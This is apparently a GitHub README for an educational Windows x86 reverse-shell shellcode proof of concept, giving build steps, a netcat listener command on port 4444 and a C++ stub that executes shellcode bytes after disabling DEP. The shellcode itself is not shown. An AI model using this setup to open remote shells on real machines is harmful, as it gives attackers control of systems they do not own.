# WinX86 Shellcode (Reverse Shell)
This POC was done for educational purpose and walkthrough to understand how windows shellcode is working and get insight about how to extract windows APIs from Dlls.

## Getting Started

These instructions will get you a copy of the POC files on your local system for purpose of testing the shellcode.

### Prerequisites
**To get the things work you have to download:**
* [MASM32 sdk](https://www.masm32.com/download.htm) - The Microsoft Assembler (commonly known as MASM)
* nmake  - It's used for building purpose and it's distributed with visual studio. 
* [python3](https://www.python.org/downloads/) - python3 interpreter.
* netcat - This simple utility reads and writes data across TCP or UDP network connections. 

### Usage
1.   Clone the repository:
```
git clone https://github.com/oviche/winx86_Shellcode.git
```
2. Open **makefile.txt** and change **masmPath** based on the location of masm32 in your local machine:
```
masmPath= //your masm32 path
```
3. Open **shellcode.asm** and change **windows.inc** path based on the location of masm32 in your local machine:
```
include masm32path\include\windows.inc
```

4. Open **Developer Command Prompt for VS** and execute following commands to build the **shellcode.asm** file to **shellcode.exe** file:
```
cd ProjectFolder path
nmake makefile.txt
```
5. To extract the shellcode bytes from **shellcode.exe** into output file called **shellcodebytes.txt** execute the following:
```
python3 shellcode_extractor.py shellcode.asm 
```

6. open **CMD** and make **netcat** listen on port what you have specified in shellcode.asm (the default is 4444):
```
nc -lvp 4444
```

7. create c or c++ project and disable **data execution prevention (DEP)** then write the following code then execute it:

```
char shellcode[] = "";	// copy shellcode from shellcodebytes.txt
char *ptr = new char[sizeof(shellcode)];
memcpy(ptr, shellcode, sizeof(shellcode));
((void(*)())ptr)();
```

### Testing environment
* The code was tested on **windows10**.


